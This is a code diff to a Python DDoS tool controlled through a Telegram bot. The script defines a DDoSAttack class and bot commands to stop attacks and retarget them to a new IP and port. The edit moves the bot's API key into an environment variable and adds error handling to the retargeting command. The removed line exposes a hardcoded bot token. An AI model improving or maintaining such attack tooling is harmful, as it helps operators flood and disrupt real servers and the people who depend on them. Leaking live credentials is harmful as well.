@@ -2,6 +2,7 @@ import requests
 from scapy.all import *
 from threading import Thread
 import time
+import os
 
 class DDoSAttack:
     def __init__(self, ip, port):
@@ -22,7 +23,7 @@ class DDoSAttack:
         self.port = new_port
 
 def telegram_bot_start():
-    bot_api_key = "8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"
+    bot_api_key = os.environ["TELEGRAM_BOT_API_KEY"]
     bot_url = f"https://api.telegram.org/bot{bot_api_key}/"
 
     # Handle commands
@@ -52,10 +53,13 @@ def telegram_bot_start():
                     ddos_attack.stop_attack()
                     send_message(chat_id, "Attack stopped.")
                 elif command_text[0] == "/change":
-                    new_ip = command_text[1]
-                    new_port = command_text[2]
-                    ddos_attack.change_target(new_ip, int(new_port))
-                    send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
+                    try:
+                        new_ip = command_text[1]
+                        new_port = int(command_text[2])
+                        ddos_attack.change_target(new_ip, new_port)
+                        send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
+                    except (IndexError, ValueError):
+                        send_message(chat_id, "Invalid command. Use /change <new_ip> <new_port>")
         time.sleep(1)
 
 if __name__ == "__main__":
